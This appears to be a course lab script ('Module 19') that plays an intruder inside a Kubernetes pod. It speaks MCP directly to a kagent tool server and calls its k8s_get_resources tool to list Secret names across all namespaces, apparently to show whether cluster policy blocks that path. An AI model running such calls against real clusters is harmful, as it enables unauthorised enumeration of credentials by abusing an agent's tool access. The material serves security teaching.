# Module 19: talk MCP to the kagent tool server directly, the way an intruder would.
# Opens a session, then calls the k8s_get_resources tool to list every Secret's name.
# Run inside a pod: kubectl -n shop exec -i deploy/course-client -- sh < platform-engineering/mcp-call.sh
U=http://kagent-tools.kagent:8084/mcp
H1='Content-Type: application/json'; H2='Accept: application/json, text/event-stream'
SID=$(curl -s -m 10 -D - -o /dev/null -X POST $U -H "$H1" -H "$H2" -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-03-26","capabilities":{},"clientInfo":{"name":"intruder","version":"1"}}}' | tr -d '\r' | awk -F': ' 'tolower($1)=="mcp-session-id"{print $2}')
echo "session: ${SID:-none (the connection was refused)}"
[ -n "$SID" ] || exit 0
curl -s -m 10 -o /dev/null -X POST $U -H "$H1" -H "$H2" -H "Mcp-Session-Id: $SID" -d '{"jsonrpc":"2.0","method":"notifications/initialized"}'
curl -s -m 30 -X POST $U -H "$H1" -H "$H2" -H "Mcp-Session-Id: $SID" -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"k8s_get_resources","arguments":{"resource_type":"secret","all_namespaces":true}}}' | sed -n 's/^data: //p' | sed 's/.*"text":"//; s/\\n/\n/g' | head -40
